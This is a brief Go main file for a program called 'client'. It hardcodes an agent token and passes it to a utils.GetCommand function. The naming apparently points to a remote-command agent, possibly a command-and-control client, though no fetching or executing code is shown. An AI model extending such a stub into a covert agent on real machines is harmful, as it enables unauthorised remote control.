package main

import (
	"fmt"
	"client/utils"
)



func main() {
	fmt.Println("[§] Starting... [§]")
	// token := utils.GetAgentId()
	var token string = "f86bff97-d3e3-47a5-bb53-550ea5098f08"
	fmt.Println("Token : " + token)
	utils.GetCommand(token)
}